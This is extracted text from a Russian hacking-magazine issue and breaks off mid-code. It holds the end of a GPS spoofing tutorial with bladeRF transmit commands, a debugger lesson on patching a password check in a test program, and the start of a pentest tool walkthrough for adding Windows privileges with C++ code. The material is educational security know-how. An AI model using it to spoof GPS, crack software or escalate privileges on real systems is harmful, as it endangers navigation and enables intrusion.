  06  54.7 20.9 23631267.8  5.3
  11  90.0 38.3 22154769.5  4.3
  12 355.4 46.2 21368898.6  4.0
  13 163.0  4.3 25471171.1 10.3
  15 186.1 19.4 24115672.2  7.7
  19  38.7  3.5 25179568.2  5.6
  20 119.8  1.4 25729982.2  7.7
  24 102.8 78.9 20375053.9  3.1
  25 312.8 32.9 22268020.3  5.5
  29 231.8 37.9 22208289.9  5.3
  32 306.8 14.9 24242464.5  8.5
  Time into run = 300.0
  Done!
  Process time = 46.2 [sec]


Не сто ит боять ся ошибки Invalid Start Time: она зна чит, что NASA еще не обно-
вило дан ные на сайте. Нужно нем ного подож дать, скачать новый файл и пов-
торить генера цию.
   Когда файл будет готов, скачиваем на наше тестовое устройство при ложе-
ние для мониторинга GPS под названием GPS Test, запус каем его и включаем
передачу на компьютере:



  lll@lll ~/s/gps-sdr-sim (master)> bladeRF-cli -i
  bladeRF> set frequency 1575.42M


  For best results, it is not recommended to set both RX and TX to the
  same frequency. Instead, consider offsetting them by at least 1 MHz
  and mixing digitally.


  For the above reason, 'set frequency ' is deprecated and
  scheduled for removal in future bladeRF-cli versions.


  Please use 'set frequency rx' and 'set frequency tx' to configure
  channels individually.


   RX1 Frequency: 1575419998 Hz (Range: [70000000, 6000000000])
   RX2 Frequency: 1575419998 Hz (Range: [70000000, 6000000000])
   TX1 Frequency: 1575419998 Hz (Range: [47000000, 6000000000])
   TX2 Frequency: 1575419998 Hz (Range: [47000000, 6000000000])


  bladeRF> set samplerate 2.6M


   Setting RX1 sample rate - req:  2600000 0/1Hz, actual:  2600000 0/1Hz
   Setting RX2 sample rate - req:  2600000 0/1Hz, actual:  2600000 0/1Hz
   Setting TX1 sample rate - req:  2600000 0/1Hz, actual:  2600000 0/1Hz
   Setting TX2 sample rate - req:  2600000 0/1Hz, actual:  2600000 0/1Hz


  bladeRF> set bandwidth 2.5M


   RX1 Bandwidth:  2500000 Hz (Range: [200000, 56000000])
   RX2 Bandwidth:  2500000 Hz (Range: [200000, 56000000])
   TX1 Bandwidth:  2500000 Hz (Range: [200000, 56000000])
   TX2 Bandwidth:  2500000 Hz (Range: [200000, 56000000])


  bladeRF> set gain tx 56


  Setting TX1 overall gain to 56 dB
   Gain TX1 overall:  56 dB (Range: [-23.75, 66])
                dsa: -90 dB (Range: [-89.75, 0])


  bladeRF> tx config file=/home/lll/soft/gps-sdr-sim/gpssim.bin format=bin
  bladeRF> tx start
  bladeRF> tx wait


На экране смартфона отобразятся спутники с хорошим уровнем сигнала.





Тем не менее мы получи ли No Fix — ста тус системы, при котором она
не может опре делить свое местоположение. Зеленые линии — это «спут-
ники» (которые в нашем случае подделаны bladeRF). Вид но, что система
работа ет и спутники видит, но определять местоположение телефон отка-
зывается. Иногда устройству нужно вре мя, чтобы при нять данные и исполь-
зовать их (TTFF), так что для чистоты эксперимен та я перезагрузил телефон
и вклю чил передачу на пять минут. Результата не пос ледовало — телефон все
так же игнориро вал наши «липовые» спут ники.
   Так как мой файл с координатами был тоже просрочен, я немного отмотал
вре мя на телефо не назад и сдви нул локацию на один километр от моей
реальной локации. Почему всего на километр? Судя по моим тестам, если
резко сме нить координаты на большое рас стояние, телефон может отбра-
сывать такие дан ные как неп равдоподоб ные, так что нуж но менять поддель-
ную локацию пос тепенно:


lll@lll ~/s/gps-sdr-sim (master)> ./gps-sdr-sim -e brdc2022_3060.22n
-d 1000 -l 51.296965,124.815687,100 -b 16 -o gpssim.bin -t 2022/11/
02,08:00:00



  Using static location mode.
  Start time = 2022/11/02,08:00:00 (2234:288000)
  Duration = 1000.0 [sec]
  02 174.0 43.6 21497540.2  3.6
  05 140.4  4.3 25351515.3  6.8
  06  41.5 11.5 24590008.1  4.2
  11  66.9 36.4 22296887.8  3.3
  12  20.6 45.8 21422074.0  3.1
  15 176.8  7.9 25304780.7  8.2
  18 198.6  4.3 25335825.2 10.3
  20 104.6  6.7 25172344.8  4.8
  22 314.6  4.6 25557500.2  8.9
  24 146.6 63.7 20898055.3  2.7
  25 332.2 40.0 21745559.7  3.7
  29 253.1 49.9 21398805.8  3.4
  32 290.3 19.4 23734754.8  6.5
  Time into run = 1000.0
  Done!
  Process time = 142.4 [sec]


Сно ва запус каем передачу и смот рим результат.





Статус отоб ражается как 3D Fix — локация определена! Время со «спутников»
12:00, что немного отстает от часов телефо на, но в пре делах нор мы. Время
жизни данных со спутников может сос тавлять от тридцати минут до четырех
часов, в зависимости от устрой ства. Реальное время смартфона (в верхнем
левом углу) 12:34, а пог решность в тридцать четыре минуты считает ся нор-
мой, в случаях, если недоступны дру гие спутники.


IPHONE

Та же ситуация и на iPhone, локация под меня ется без особых проблем. Давай
высадимся в Персидском заливе!





Готово! Это новый телефон, который никог да рань ше не видел сигнала GPS,
так что он довольно быстро под хватил фей ковую локацию. Wi-Fi и подклю-
чение к сети сотовой связи не помог ли телефо ну понять, что координаты —
под делка.


ÍÀ ×ÒÎ ÎÁÐÀÒÈÒÜ ÂÍÈÌÀÍÈÅ

Вот несколь ко простых пра вил, которых стоит придер живаться при спу финге
GPS:
 1. Сле ди за данными, которые берешь с сайта NASA, — они часто обновля-
   ются.
 2. Сле ди за вре менем, которое «спут ники» отправляют на устрой ство:
   некоторые девайсы не работают со слиш ком уста ревшими данными.
 3. Дай устройству вре мя для «сохранения» фей ковых спутников.
 4. Не меняй локацию сразу на далекую — такие неправдо подоб ные значения
   будут проигнорированы, а потом пот ребуется нам ного больше времени
   на обра бот ку нормаль ных сигналов.
 5. Обрати вни мание на Wi-Fi и сотовую связь: иногда они могут исполь-
   зовать ся для определения локации, но на «чис тых» устройствах даже они
   не помогут.
 6. Используй пра вильную антенну.
 7. Если используешь HackRF, про верь, есть ли у тебя внешний кварцевый
   резонатор, иначе вре мя будет плавать.

При веду еще несколь ко моих наб людений и предположе ний:
 • В разных частях Земли работают раз ные спутники, так что, если под менить
   толь ко спутники, которые чаще всего встре чаются в текущей локации,
  шанс на успех будет больше.
 • Некоторые карты используют сторон ние источни ки для определе ния
   локации. Данные с Apple Maps и Google Maps иногда отличаются. У Google
   локация была точ нее.
 • Очистка старых дан ных GPS поможет обмануть прак тически любое устрой-
   ство.
 • Шан сы повышает установка максимально близкого к реальности времени
   (в данных с сайта NASA), и, если это не помога ет, можно дать устройству
   несколь ко минут (до десяти-пятнадцати), чтобы обработать новые данные.
  На новом устрой стве это ожи дание потребу ется почти наверняка.


ÂÛÂÎÄÛ

Несмотря на то что производители устройств предпринимают раз ные шаги
для того, что бы пре дотвратить спуфинг, он при определенных условиях все
же воз можен. И чем больше на свете авто номных устрой ств, тем большей
проблемой это может стать. Одно дело — разыг рать приятеля, «отправив»
его телефон в Сенегал, дру гое — ког да кто-то зас тавит «Тес лу» с автопило-
том свер нуть не туда. © X
ВЗЛОМ





        НАХОДИМ РЕАЛЬНЫЕ
         АДРЕСА ИНСТРУКЦИЙ
      В ИСПОЛНЯЕМЫХ ФАЙЛАХ
                 X86-64





                            Крис Касперски         Юрий Язев
                              Известный российский      Широко известен под
                                   хакер. Легенда ][, ex-      псевдонимом yurembo.
                              редактор ВЗЛОМа. Также   Программист, разработчик
                              известен под псевдонимами   видеоигр, независимый
                             мыщъх, nezumi (яп.    ,   исследователь. Старый автор
                             мышь), n2k, elraton, souriz,       журнала «Хакер».
                                        tikus, muss, farah, jardon,      yazevsoft@gmail.com
                                   KPNC.



Пред ставь, что ты нашел с помощью отладчика адреса бай-
тов, которые нуж но изменить в программе, и обнаружил, что
в фай ле на дис ке таких адресов нет. Какие инструк ции
в таком случае пра вить? Об этом и поговорим сегод ня.
По сути, нам предстоит разоб раться, как процесс проеци-
рует ся в виртуальное адресное пространс тво.




Пе ред тобой уже во второй раз обновлен ная вер сия цикла «Фундаменталь-
ные основы хакерства». В 2018 году текст Криса Кас перски был переде лан
для соответствия новым версиям Windows и Visual Studio, а теперь обновлен
с уче том отладки программ для 64-разрядной архитек туры.
  Читай также улучшенные версии прошлых статей цикла:
 1. Учим ся ана лизи ровать программы для x86-64 с нуля
 2. Используем отладчик для анализа 64-раз рядных программ в Windows

Все новые версии статей доступны без платной подписки.





Цикл «Фундаментальные основы хакерства» со все ми обновлениями опуб-
ликован в виде книги, купить ее по выгод ной цене ты можешь на сайте изда-
тель ства «Солон-пресс».


Ко неч но, у нас есть дизассем блер, с помощью которо го мы нашли эти адреса
(под робнее об этом в статье «Учимся анализировать программы для x86-
64 с нуля»). Это удалось во многом бла года ря тому, что пре парируемая нами
программа очень маленькая и нам не составило тру да разобраться в ее
дизассем бли рованном лис тинге. А если бы исследуемая программа весила
сотни мегабайт?
   Также мы выяснили, что PE-файл может быть заг ружен по адресу, отлично-
му от того, для которого он был соз дан (это свойство называется переме-
щаемостью), при этом система автоматичес ки корректирует все ссылки
на абсо лют ные адре са, заменяя их новыми значениями. В результате образ
файла в памяти не будет соответствовать тому, что записано на диске. И это
про исхо дит пос ле каждой перезаг рузки системы, а порой даже перезапус ка
при ложе ния. Всякий раз PE-файл помещается по новому адре су.
  Вдо бавок к этому если рань ше (до «Висты») системный загрузчик мог
переме щать только DLL (в то же время, если ему не удавалось раз местить
в памяти по заданным адресам .exe, Windows выдава ла ошибку загрузки
модуля), то теперь исполняемые фай лы тоже подвержены переме щению.
  Между тем ошиб ка заг рузки модуля про исходила доволь но редко, потому
что, как мы прек расно знаем, для каждого процес са Windows выделя ет
незави симое вир туальное адресное пространс тво. Во вре мена 32-битной
Windows это было 2 Гбайт ядерного пространс тва и 2 Гбайт пользовательско-
го. То есть по факту для про цесса выделялось толь ко 2 Гбайт, а 2 Гбайт ядер-
ного прос транства были общи ми для всех процессов, к которым код из поль-
зовательско го режима дос тупа не имел.
  При  включении режима PAE  пользовательско му  пространству  дос-
тавалось 3 Гбайт и, соот ветс твенно, 1 Гбайт — ядерному. PAE в процессорах
x86 стал нужен для работы системы DEP, препятствующей выполнению кода
в секции данных. DEP автоматически включена во всех более поздних про-
цессорах. Если пользовательское прос транство обособ лено для конкретного
про цесса,  то пространство  ядра общее  для  всех привилегированных
механизмов, выполняющих ся в нулевом коль це.
  Для x86-64 картина в целом аналогична. Адресное прос транство заметно
уве личилось, теоретически до 16 Эбайт. Но так как современные процессоры
фактически исполь зуют только 48 бит для адре сации пространс тва, реально
используется лишь малая часть: 8 Тбайт для поль зователь ского режима
и 248 Тбайт для ядерного. Конеч но, пока эти раз меры кажут ся заоблачны-
ми — пример но как 4 Гбайт в конце 1980-х!
   Те перь, когда в общих чертах кар тина обрисована, можно двигаться даль-
ше. Чтобы най ти адрес нужной инструк ции на диске, вкратце повторим пос-
ледовательность действий из прошлой статьи. За прошедшее время ты
наверняка перезаг рузил компь ютер, поэто му адреса в памяти изме нились.
  Сначала вос поль зуемся ути литой dumpbin из штатной пос тавки Visual Stu-
dio, на этот раз с ее помощью най дем базовый адрес модуля — тот,
с которым работают Hiew (или другой шестнадцатеричный редактор) и дизас-
сем блер:


dumpbin /headers passcompare1.exe
OPTIONAL HEADER VALUES
...
140000000 image base (0000000140000000 to 0000000140007FFF)
…

Натравим отладчик на подопытную программу. Опре делим адрес загрузки
модуля приложе ния в памяти (в твоем случае результаты будут другими):


0:000> lmf m passcompare1
start             end                module name
00007ff7`159b0000 00007ff7`159b8000  passCompare1 passCompare1.exe

Далее нам нужно най ти адрес инструкции, которую надо изме нить. Для этого
первым делом ищем расположе ние эта лонного пароля (он находится в сек-
ции .rdata), поэтому вос пользуемся командой !dh passCompare1, которая
выведет све дения о секциях. Сложим адрес загрузки модуля и виртуальный
адрес секции .rdata.
   Та ким образом, в моем случае сек ция .rdata начина ется с адреса 0x7F-
F7159B2000. Немного прокрутив вывод отладчика вниз, я вижу, что пароль
рас полагается по адресу 0x7ff7159b2280. Теперь нам нужен адрес рас-
положения инструк ции в памяти. Не напрягая мозг, лег ким дви жением руки
пос тавим бряк на пароль: ba r4 7ff7159b2280. Продол жим отладку и вве-
дем любой пароль, после всплытия отладчи ка по команде gu сделаем выход
из текущей функции. Мы попада ем на сравнивающую инструкцию TEST EAX,
EAX, которую нам надо заломить, а слева в первом столбце видим ее адрес:
0x7ff7159b10c3. Если попробовать най ти его в файле, то Hiew скажет, что
такой адрес отсутс твует.
  Но теперь, когда есть все необ ходимые зна чения, нетрудно пос читать, что
адрес 0x7ff7159b10c3 будет соот ветство вать адресу


адрес инструкции в файле на диске == адрес инструкции в памяти –
(адрес загрузки модуля – базовый адрес модуля):


0x7ff7159b10c3 – (0x7ff7159b0000 – 0x140000000) == 0x7ff7159b10c3 –
7FF5D59B0000 == 1400010C3

Для про вер ки заглянем в дизассем блерный листинг и с удовлетворени ем
обнаружим, что это как раз тот адрес, инструкцию по которому мы правили:


00000001400010C3: 85 C0  test  eax,eax
00000001400010C5: 74 58  je    000000014000111F

Все верно, пос мотри, как хорошо это совпадает с дам пом отладчи ка:


00007ff7`159b10c3 85c0  test  eax, eax
00007ff7`159b10c5 7458  je    passCompare1!main+0xaf (7ff7159b111f)

Следующим действием заломим прог рамму. Это мы уже про ходи ли в треть ем
шаге первой статьи. Ничего нового непосредственно во взло ме не появи-
лось, мы наш ли адрес, а процеду ра кря ка такая же: запускаем Hiew — и в бой.


ÏÅÐÅÌÅÙÀÅÌÎÑÒÜ DLL

Под занавес прошлой статьи мы упомяну ли, что в старых вер сиях Windows
можно было заг рузить один и тот же модуль .exe два раза, пред ставив его
в виде DLL. Однако сей час этот трюк не про катывает, собственно, он и не
нужен, пос кольку, как мы уви дели в пре дыдущем раз деле, Windows свободно
переме щает в памяти заг руженный модуль .exe относительно заранее опре-
деленных адре сов. Теперь давай разберемся, как обсто ят дела с динамичес-
кими библиотеками.
  Для раз нооб разия следующие примеры откомпилиру ем для плат формы
IA-32. На самом деле 32-бит ных приложений раз работано так мно го, что их
при дется анализи ровать еще много лет.
  В том случае, когда адрес загрузки DLL заранее неизвестен, системный
загрузчик корректирует непосредствен ные смещения в соответс твии с выб-
ранным базовым адре сом заг рузки. Это несколько замедляет загрузку при-
ложения, но зато не ухуд шает быстродействие самой прог раммы.
   Единственная проб лема — как отличить дей ствительные непосредствен-
ные сме щения от констант, совпада ющих с ними по значению? Не дизассем-
бли ровать же, в самом деле, DLL, что бы разобрать ся, какие именно ячейки
в ней необ ходимо «подкрутить»? Верно, куда проще перечислить их адре са
в спе циальной таб лице, расположенной непос редс твенно в загружаемом
файле и носящей гордое имя «таб лицы переме щаемых элементов». За ее
формирование отве чает компоновщик.
   Чтобы познакомиться с ней поб лиже, откомпилируем и изучим сле дующий
при мер:


fixupdemo.c:
__declspec(dllexport) void meme(int x)
{
    static int a=0x666;
    a=x;
}

Откомпи лируем командой cl fixupdemo.c /LD и тут же дизассембли руем
его:


DUMPBIN /DISASM fixupdemo.dll > fixupdemo-disasm.txt
DUMPBIN /SECTION:.data /RAWDATA fixupdemo.dll > fixupdemo-data.txt


10001000: 55              push  ebp
10001001: 8B EC           mov   ebp,esp
10001003: 8B 45 08        mov   eax,dword ptr [ebp+8]
10001006: A3 30 60 00 10  mov   dword ptr ds:[10006030h],eax
1000100B: 5D              pop   ebp
1000100C: C3              ret


RAW DATA #3
 10006000: 00 00 00 00 00 00 00 00 00 00 00 00 63 28 00
10  ............c(..
 10006010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00  ................
 10006020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00  ................
 10006030: 66 06 00 00 E3 11 00 10 FF FF FF FF 00 00 00 00  f...a...
yyyy....

Су дя по  коду,  запись содержимого EAX  всег да про исходит  в  ячейку
0x10006030. Но не торопись с вывода ми! Давай посмотрим содержимое таб-
лицы перемещаемых эле мен тов:


DUMPBIN /RELOCATIONS fixupdemo.dll > fixupdemo-relocations.txt


BASE RELOCATIONS #4
1000 RVA, 164 SizeOfBlock
   7  HIGHLOW  10006030
  1C  HIGHLOW  10005004
  23  HIGHLOW  10008A50
  32  HIGHLOW  10008A50
  3A  HIGHLOW  10008A51

Таб лица переме щаемых элементов-то не пус та! И первая же ее запись ука-
зывает на ячей ку 0x100001007, полученную алгебра ическим сложением сме-
щения 0x7 с RVA-адресом 0x1000 и базовым адресом загрузки 0x10000000
(получи его с помощью DUMPBIN самос тоятель но). Смотрим — ячейка
0x100001007 принадлежит инструкции MOV [0x10006030],EAX и указывает
на самый старший байт непосредс твенного сме щения. Вот это самое сме-
щение и корректирует загрузчик в ходе подклю чения динамичес кой биб-
лиотеки (разуме ется, если в этом есть необ ходимость).
  Же лаешь про верить? Пожалуйста, соз дадим две копии одной DLL (нап-
ример, с помощью команды copy fixupdemo.dll fixupdemo2.dll) и заг-
рузим их поочередно сле дующей программой:


fixupload.c:
#include <windows.h>
main()
{
  void (*demo) (int a);
  HMODULE h;
  if ((h=LoadLibrary("fixupdemo.dll")) &&
   (h=LoadLibrary("fixupdemo2.dll")) &&
   (demo=(void (*)(int a))GetProcAddress(h,"meme")))
    demo(0x777);
}

Сра зу же из командной строки откомпилиру ем: cl fixupload.c.
  Поскольку по одно му и тому же адресу две раз личные DLL не загрузишь
(откуда же системе знать, что это одна и та же DLL!), загрузчику приходится
при бегать к ее перемещению. Загрузим откомпилиро ванную программу
в отладчик и установим точ ку оста нова на функцию LoadLibraryA командой
bp KernelBase!LoadLibraryA.
  К слову, команда bp позволяет уста новить точку останова по адре су, опре-
деленному функцией. Установка точки оста нова на первую команду необ-
ходима, чтобы про пустить startup-код и попасть в тело функции main. Как лег-
ко убедиться, исполнение прог раммы начинается отнюдь не с main, а со слу-
жебного кода, в котором очень легко уто нуть. Но откуда взя лась загадочная
буква А на конце име ни функции? Ее про исхождение тесно связано с вве-
дени ем в Windows под держки уни кода.
  Применитель но к LoadLibrary — теперь имя библиотеки может быть
написано на любом языке. Звучит заманчиво, но не ухудшает ли это произво-
дительность? Разуме ется, ухудшает, еще как! В большинс тве слу чаев вполне
достаточно ста рой доброй кодировки ASCII. Так какой же смысл бросать дра-
гоценные  такты про цес сора на ветер? Ради про изводительности было
решено  поступить ся  раз мером,  создав  отдель ные  варианты  функций
для работы с уникодом и ASCII-символами. Первые получи ли суффикс W (от
Wide — широкий), а вторые — А (от ASCII). Эта тонкость скры та от прикладных
программистов. Какую именно функцию вызывать — W или А, решает ком-
пилятор, но при работе с отладчи ком необ ходимо указывать точное имя фун-
кции — самостоятельно определить суффикс он не в состоянии. Камень
преткно вения в том, что некоторые функции, нап ример ShowWindows, вооб ще
не имеют суффиксов — ни А, ни W — и их биб лиотеч ное имя совпадает
с каноничес ким. Как же быть?
  Самое прос тое — заг лянуть в таб лицу импорта пре парируемого фай ла
и отыскать там нужную функцию. Например, применительно к нашему случаю:


>DUMPBIN /IMPORTS fixupload.exe > fixupload-imports.exe
...
175 GetVersionExA
1C2 LoadLibraryA
CA GetCommandLineA
174 GetVersion
7D ExitProcess
29E TerminateProcess
F7 GetCurrentProcess
...





      Developer Command Prompt for VS2017 с введен ными командами

Из при веденного выше фраг мента видно, что LoadLibrary все-таки име ет
суффикс А, а вот функции ExitProcess и TerminateProcess не име ют суф-
фиксов, пос коль ку вооб ще не работа ют со стро ками.
  Но вернемся к нашим баранам, от которых нам пришлось так далеко отой-
ти. Итак, мы пос тавили бряк на LoadLibraryA и продол жили выпол нение
программы, она моментально снова оста навлива ется на точке останова.





    Содержимое отладчи ка в момент останова на функции LoadLibraryA

Нажима ем сочетание Shift-F11 для выхода из LoadLibraryA (анализировать
ее, в самом деле, ни к чему) и ока зываемся в лег ко узнаваемом теле фун кции
main:


0040100b ff1504504000  call dword ptr [fixupload+0x5004 (00405004)]
00401011 8945f8        mov  dword ptr [ebp-8], eax ss:002b:
0019ff38=00401055
00401014 837df800      cmp  dword ptr [ebp-8], 0
00401018 7437          je   fixupload+0x1051 (00401051)
0040101a 6840604000    push offset fixupload+0x6040 (00406040)
0040101f ff1504504000  call dword ptr [fixupload+0x5004 (00405004)]
…
00401046 6877070000     push    777h
0040104b ff55fc         call    dword ptr [ebp-4]

Только после воз вра щения из LoadLibraryA отладчик не под ставил в место
вызова фун кции ее символьное имя строкой выше выделенной:


call  dword ptr [fixupload+0x5004 (00405004)]

Запом ним ее как вызов LoadLibraryA.
  Обрати внимание на содержимое регистра EAX (для этого служит команда
r <имя регистра>) — функция возвра тила в нем адрес загрузки (на моем
компьюте ре рав ный 0x10000000). Про должая трас сировку (кнопка F10), дож-
дись выполнения вто рого вызова LoadLibraryA.
  Не прав да ли, на этот раз адрес заг рузки изме нился? На моем компьюте-
ре он равен 0x001d0000.
  Приб лижаемся к вызову функции demo. В отладчи ке это выглядит так:


push 777h
call dword ptr [ebp-4]

Вторая инструкция ни о чем не говорит, но вот аргу мент 0x777 в первой инс-
трукции определен но что-то нам напоминает. Смотри исходный текст fixu-
pload.c. Не забудь переставить палец с клавиши F10 на клавишу F8, чтобы
войти внутрь функции.


001d1000 55          push  ebp
001d1001 8bec        mov   ebp, esp
001d1003 8b4508      mov   eax, dword ptr [ebp+8]
001d1006 a330601d00  mov   dword ptr [fixupdemo2!meme+0x5030 (
001d6030)], eax
001d100b 5d          pop   ebp
001d100c c3          ret

Вот оно! Системный  заг рузчик скорректи ровал адрес ячейки сог ласно
базово му адресу заг рузки самой DLL. Это, конечно, хорошо, да вот проб-
лема — в оригиналь ной DLL нет ни такой ячей ки, ни даже пос ледовательнос-
ти A3 30 60 1D 00, в чем лег ко убедиться, произве дя контекстный поиск.
Допустим, воз намерились бы мы затереть эту коман ду NOP’ами. Как най ти
это место в ори гинальной DLL?
  Обратим свой взор выше, на команды, заведомо не содер жащие переме-
щаемых эле ментов:


001d1000 55      push  ebp
001d1001 8bec    mov   ebp, esp
001d1003 8b4508  mov   eax, dword ptr [ebp+8]

Отчего бы не поискать последовательность 55 8B EC 8B 45 08 A3? В дан-
ном случае это сработает, смотри, как хорошо совпадает:


10001000: 55              push  ebp
10001001: 8B EC           mov   ebp,esp
10001003: 8B 45 08        mov   eax,dword ptr [ebp+8]
10001006: A3 30 60 00 10  mov   dword ptr ds:[10006030h],eax

Но если бы перемещаемые элементы были гус то переме шаны с «нормаль-
ными», ничего бы не вышло. Опорная пос ледова тельность оказалась бы
слишком короткой для поиска и выдала бы множество ложных сра баты ваний.
  Более изящно и надежно вычислить истинное содержимое перемещаемых
элементов, выч тя из них разницу меж ду действительным и рекомендуемым
адресом загрузки. В дан ном случае:


модифицированный загрузчиком адрес – (базовый адрес загрузки –
рекомендуемый адрес загрузки): 0x1d6030 – (0x001d0000 – 0x10000000)
== 0x1d6030 – FFFFFFFFF01D0000 == 0x10006030





                   Найденная в Hiew инструкция

Учи тывая обратный порядок следования байтов, получаем, что инструкция
mov dword ptr ds:[10006030h],eax в машинном коде должна выглядеть
так: A3 30 60 00 10. Ищем ее в Hiew, и чудо — она есть! © X
ВЗЛОМ





      УПРАВЛЯЕМ ПРИВИЛЕГИЯМИ
            В WINDOWS





Привиле гии в Windows играют очень важ-
ную роль, так как админис тратор име ет воз-
можность пре доставить специаль ные пра ва
пользовате лям  для  решения  их  задач.
В этой статье мы познакомимся с инстру-         MichelleVermishelle                                                                                   18 y.o. | TG: @MichaelZhm
мен том Privileger, который позволяет отыс-        michael.zhmailo@yandex.ru
кивать в системе учетные записи с опре-
деленными привилегиями и менять при-
виле гии у заданного акка унта.


О работе с при виле гиями я писал в прошлой статье, но мы рассмотрели лишь
обрывки кода, которые, как оказалось, сложно было превратить в полноцен-
ный про ект. Поэтому, когда на очередном пентесте мне вновь потребова лось
кодить все с нуля, я понял, что без готового инстру мента не обойтись. И сде-
лал Privileger, который, к моему удивлению, стал достаточно популяр ным.





                       Релиз инстру мента

В сегод няшней статье мы раз берем прин цип работы этого инструмента,
а также про бежимся по всем пяти режимам, которые позволя ют:
 • до бавить при виле гии локальному аккаунту с помощью вызова лишь одной
  функции. Раньше это мож но было сде лать только через GPO и, если мне
   не изме няет память, еще тре бовалась перезагрузка хоста, что не очень
   удобно;
 • запустить про цесс, добавив в его токен конкрет ную привилегию;
 • удалить при виле гию  у аккаунта. Опять же раньше это выполнялось
   с помощью GPO — сейчас используется вызов фун кции;
 • обнаружить акка унт с нужной привиле гией на какой-нибудь машине;
 • обнаружить при виле гии у акка унта на какой-нибудь машине.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




            УПРАВЛЯЕМ ПРИВИЛЕГИЯМИ В WINDOWS





ÄÎÁÀÂËßÅÌ ÏÐÈÂÈËÅÃÈÈ ÀÊÊÀÓÍÒÓ

Итак, все, как и в любом другом проекте на языке С, начинается с функции
main(), в которую прилетают все нужные парамет ры. После чего для обес-
печения корректного вывода кирилличес ких (и иных) символов дергаем set-
locale(), выводим прекрасный ASCII-бан нер и приступаем к валидации
входных данных.


int wmain(int argc, wchar_t* argv[]) {
    setlocale(LC_ALL, "");
    ShowAwesomeBanner();


    DWORD dwRC = 0, dwV = 0;
    if (argc != 4) {
        ShowHelp();
        return 0;
    }



    switch (*argv[1]) {
    case '1':
        if (ValidateAccInfo(argv[2], argv[3]) == 0) {
            dwRC = InitMode1(argv[2], argv[3]);
        }
        break;
    case '2':
        if (ValidatePathInfo(argv[2], argv[3]) == 0) {
            dwRC = InitMode2(argv[2], argv[3]);
        }
        break;
    case '3':
        if (ValidateAccInfo(argv[2], argv[3]) == 0) {
            dwRC = InitMode3(argv[2], argv[3]);
        }
        break;
    case '4':
        if (ValidatePriv(argv[3])) {
            dwRC = InitMode4(argv[2], argv[3]);
        }
        else {
            std::wcout << L"[-] ValidatePriv() Failed" << std::endl;
        }
        break;
    case '5':
        std::wcout << L"[!] I'm not able to validate username and PC
name. Make sure you enter the correct data." << std::endl;
        Sleep(500);
        std::wcout << L"[!] Starting" << std::endl;
        if (InitMode5(argv[2], argv[3]) != 0) {
            std::wcout << L"[-] InitMode 5 Error" << std::endl;
        }
        break;
    default:
        std::wcout << L"[-] No such mode" << std::endl;
        return 0;
    }
    return dwRC;
}

Ес ли тре буется использовать первый режим работы, то есть добавить при-
вилегии аккаунту, пользователь должен предос тавить следующие входные
данные:
 • 1 — режим работы;
 • имя поль зовате ля — кому навешивать привилегию;
 • программное имя при виле гии — какую при вилегию добавлять.

Программное имя привилегии — это само имя привилегии. Есть еще так
называемое дружественное имя — это ее описание. Например, програм мное
имя SeDebugPrivilege, а дружествен ное — Отладка программ.
   Итак, обращаем ся к Privileger.


.\Privilegerx64.exe 1 Michael SeDebugPrivilege





                  Успешное добавление привилегии

Я пре дусмотрел проверку на валидность имени поль зователя, а также имени
при виле гии, что бы пре дотвратить очепят ки. Про верка реализуется функцией
ValidateAccInfo(), которая при нимает имя пользователя, а также програм-
мное имя привилегии.


DWORD ValidateAccInfo(wchar_t* cAccName, wchar_t* cPrivName) {
    // validating username
    DWORD sid_size = 0;
    PSID UserSid;
    LPTSTR wSidStr = NULL;
    DWORD domain_size = 0;
    SID_NAME_USE sid_use;
    DWORD wow = LookupAccountName(NULL, cAccName, NULL, &sid_size,
NULL, &domain_size, &sid_use);
    DWORD dw = GetLastError();
    if ((wow == 0) && ( (dw == 122) || (dw == 0))) {
        std::wcout << L"[+] User " << cAccName << L" found" << std::
endl;


        // validating Privilege name
        if (!ValidatePriv(cPrivName)) {
            std::wcout << L"[-] ValidateAccInfo() failed" << std::
endl;
            return 1;
        }
        else {
            std::wcout << L"[+] ValidateAccInfo() success" << std::
endl;
            return 0;
        }
    }
    else {
        std::wcout << L"[-] Username may be incorrect.
LookupAccountName() Err: " << dw << std::endl;
        return 1;
    }
    return 1;
}





                 Указание неверного име ни привиле гии





                  Неверное имя пользователя

Проверку име ни поль зователя я сделал с помощью функции LookupAccount-
Name(). Сама по себе она служит для получе ния SID (security identier) поль-
зователя по его име ни, но нам нич то не мешает использовать ее просто
для провер ки име ни пользователя, ведь если компьютер не обнаружит поль-
зователя с таким именем, то и вызов функции при ведет к ошибке.
  Провер ку программного име ни при вилегии я так же вынес в отдельную
функцию.


BOOL ValidatePriv(wchar_t* cPrivName) {
    LUID luid;
    if (!LookupPrivilegeValue(NULL, cPrivName, &luid)) {
        std::wcout << L"[-] Privilege " << cPrivName << L" may be
incorrect" << std::endl;
        return FALSE;
    }
    else {
        std::wcout << L"[+] Privilege " << cPrivName << L" Found \n[
+] Validation Success" << std::endl;
        return TRUE;
    }
}

Здесь  алгоритм  схож: дергаем  LookupPrivilegeValue(), если привилегия
есть — все ок, если нет — ошибка.
   Убе див шись, что предоставлен ные дан ные верны, инстру мент вызывает
InitMode1(), которо му также переда ет имя пользователя и имя привиле гии.
Внутри этой функции мы получаем хендл на LSA текуще го компь ютера (так
как работаем с при вилегиями локального акка унта) вызовом функции Get-
Policy().


DWORD InitMode1(wchar_t* cAccName, wchar_t* cPrivName) {
    std::wcout << L"[+] Initializing mode 1 \n [+] Target Account: "
<< cAccName << "\n [+] Privilege: " << cPrivName << std::endl;
    LSA_HANDLE hPolicy;
    if (GetPolicy(&hPolicy) != 0) {
        std::wcout << L" [-] GetPolicy() Error: " << std::endl;
        return 1;
    }
    AddUserPrivilege(hPolicy, cAccName, cPrivName, TRUE);
    return 0;
}


DWORD GetPolicy(PLSA_HANDLE LsaHandle){
    wchar_t cCompName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD size = sizeof(cCompName);
    if (GetComputerNameW(cCompName, &size)) {
        std::wcout << L" [+] ComputerName: " << cCompName << std::
endl;
    }
    else {
        std::wcout << L" [-] GetComputerNameW Error: " <<
GetLastError() << std::endl;
    }


    LSA_OBJECT_ATTRIBUTES lsaOA = { 0 };
    LSA_UNICODE_STRING lsastrComputer = { 0 };
    lsaOA.Length = sizeof(lsaOA);
    lsastrComputer.Length = (USHORT)(lstrlen(cCompName) * sizeof(
WCHAR));
